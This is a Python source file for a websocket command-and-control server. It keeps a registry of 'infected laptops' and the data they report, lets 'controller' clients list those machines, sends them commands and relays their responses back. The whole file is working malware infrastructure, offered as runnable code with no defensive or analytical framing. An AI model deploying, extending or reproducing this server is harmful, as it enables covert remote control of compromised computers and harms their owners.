import asyncio
import websockets
import json
import uuid
import logging
import socket
from datetime import datetime, timedelta
from pythonjsonlogger import jsonlogger

# Configure logging
log_handler = logging.StreamHandler()
formatter = jsonlogger.JsonFormatter()
log_handler.setFormatter(formatter)

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
logger.addHandler(log_handler)

# Store connected computers and messages
clients = {}
messages = []

# Message retention time (1 day)
MESSAGE_RETENTION_PERIOD = timedelta(days=1)

# Cleanup old messages
def cleanup_old_messages():
    global messages
    cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD
    messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
    logger.info("Cleaned up messages.", extra={"remaining_messages": len(messages)})

# Register a new client or return an existing client
async def register_client(websocket, role, client_id=None, data=None):
    # If no client_id is provided, assign a new one
    if not client_id:
        client_id = str(uuid.uuid4())
        logger.info(f"Assigning new ID to client: {client_id}")

    clients[client_id] = {
        'websocket': websocket,
        'last_seen': datetime.now(),
        'role': role,
        'data': data,
        'messages': [],
        'disconnected_at': None
    }
    logger.info("Registered or updated client.", extra={"role": role, "client_id": client_id, "data": data})
    
    # Send the client ID back to the client
    await websocket.send(json.dumps({"type": "assign_id", "client_id": client_id}))
    return client_id

# Handle messages from controllers
async def handle_controller_messages(websocket, client_id):
    while True:
        try:
            message = await websocket.recv()
            data = json.loads(message)
            logger.info(f"Received message from controller {client_id}: {data}")

            if data.get("type") == "command":
                await handle_command(data, client_id)

            elif data.get("type") == "request_client_list":
                await send_client_list(websocket)

        except websockets.ConnectionClosed:
            logger.info(f"Controller {client_id} disconnected.")
            clients[client_id]['disconnected_at'] = datetime.now()
            break

        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error from controller {client_id}: {e}")
            break

        except Exception as e:
            logger.error(f"Error handling controller message from {client_id}: {e}", exc_info=True)
            break

# Handle messages from infected laptops
async def handle_infected_messages(websocket, client_id):
    while True:
        try:
            message = await websocket.recv()
            data = json.loads(message)
            logger.info(f"Received message from infected laptop {client_id}: {data}")

            if data.get("type") == "response":
                await handle_response(data)

        except websockets.ConnectionClosed:
            logger.info(f"Infected laptop {client_id} disconnected.")
            clients[client_id]['disconnected_at'] = datetime.now()
            break

        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error from infected laptop {client_id}: {e}")
            break

        except Exception as e:
            logger.error(f"Error handling infected message from {client_id}: {e}", exc_info=True)
            break

# Relay messages to the appropriate handler
async def relay_messages(websocket, client_id, role):
    try:
        if role == 'controller':
            await handle_controller_messages(websocket, client_id)
        elif role == 'infected':
            await handle_infected_messages(websocket, client_id)

    except Exception as e:
        logger.error(f"Error in relay_messages for client {client_id} with role {role}: {e}", exc_info=True)

# Handle commands from controllers
async def handle_command(data, client_id):
    target_id = data['target']
    command = data['command']
    command_type = data['command_type']

    logger.info("Processing command.", extra={"target_id": target_id, "command": command})

    if target_id in clients and clients[target_id]['role'] == 'infected':
        target_ws = clients[target_id]['websocket']
        command_id = str(uuid.uuid4())
        command_time = datetime.now()

        new_message = {
            'id': command_id,
            'origin': client_id,
            'target': target_id,
            'command_time': command_time,
            'response_time': None,
            'type': command_type,
            'command': command,
            'response': None
        }

        await target_ws.send(json.dumps(new_message))
        messages.append(new_message)
        logger.info("Command sent to target.", extra={"target_id": target_id, "message": new_message})
    else:
        logger.warning("Target not connected.", extra={"target_id": target_id})

# Handle responses from infected laptops
async def handle_response(data):
    command_id = data['command_id']
    response = data['response']
    logger.info(f"Processing response for command ID {command_id}")

    for msg in messages:
        if msg['id'] == command_id:
            msg['response'] = response
            msg['response_time'] = datetime.now()
            logger.info("Updated message with response.", extra={"msg": msg})
            break

    origin_id = msg['origin']
    if origin_id in clients:
        origin_ws = clients[origin_id]['websocket']
        await origin_ws.send(json.dumps(msg))
        logger.info("Response relayed to origin.", extra={"origin_id": origin_id, "msg": msg})

# Send the list of clients to the controller
async def send_client_list(websocket):
    clients_list = {
        client_id: {
            'last_seen': client['last_seen'],
            'role': client['role'],
            'data': client.get('data', {})
        }
        for client_id, client in clients.items()
    }

    response = {'type': 'infected_list', 'infected_laptops': clients_list}
    await websocket.send(json.dumps(response))
    logger.info("Sent client list to controller.", extra={"clients_list": clients_list})

# Connection handler
async def connection_handler(websocket, path):
    client_id = None
    try:
        # Step 1: Receive the initial message (contains role and optionally client_id)
        initial_message = await websocket.recv()
        initial_data = json.loads(initial_message)

        role = initial_data['role']
        client_id = initial_data.get('client_id')  # Client ID may be provided by a returning client
        data = initial_data.get('data') if role == 'infected' else None

        # Step 2: Register or assign a client ID
        client_id = await register_client(websocket, role, client_id, data)

        # Step 3: Relay messages from the client
        await relay_messages(websocket, client_id, role)

    except websockets.ConnectionClosed:
        logger.info(f"Connection closed for client {client_id if client_id else 'unknown'}")
        if client_id in clients:
            clients[client_id]['disconnected_at'] = datetime.now()

    except Exception as e:
        logger.error("Exception occurred in connection handler.", exc_info=True, extra={"client_id": client_id})

# Get the local IP address of the server
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Start the server
async def main():
    ip_address = get_local_ip()
    port = 6857

    logger.info("Server listening.", extra={"ip": ip_address, "port": port})

    async with websockets.serve(connection_handler, "0.0.0.0", port):
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    asyncio.run(main())
